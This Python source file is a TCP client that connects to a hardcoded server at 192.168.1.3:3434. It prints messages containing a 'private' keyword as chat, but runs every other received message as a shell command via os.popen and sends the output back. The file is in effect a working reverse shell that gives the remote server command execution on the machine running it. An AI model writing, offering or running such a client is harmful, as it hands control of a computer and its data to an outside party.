from socket import *
import time
import os

# ___Trying to connected to the server___
try:
    # ___Creating the client___
    client = socket(AF_INET, SOCK_STREAM)
    client.connect(("192.168.1.3",3434))
    print("_____WELCOME_____\n")

    # ___An infinite loop for checking the data___
    while True:
        data = client.recv(2048).decode()
        if data == "y" or data == "Y":
            print('[-] You have been removed!')
            client.close()
            break

        # ___Some keywords for the unicast message function___
        if 'private' in data or 'PRIVATE' in data or 'Private' in data or 'private:' in data or 'Private:' in data or 'PRIVATE:' in data or 'private ' in data or 'PRIVATE ' in data or 'Private ' in data or 'private: ' in data or 'Private: ' in data or 'PRIVATE: ' in data:
            print("{0}".format(data))
        else:
            # ___Try & Except for the command execute___
            try:
                result = os.popen(data).read()
                client.sendall(result.encode())

            except OSError as e:
                print("[-] {0}\n No such a command".format(e))


# ___If the server is disconnected or not connected, these lines will run___
except:
    for i in range(3,0,-1):
        print("[-] Server is not available, closing in {0}".format(i))
        time.sleep(1)
    print("__________________CLOSED_________________")
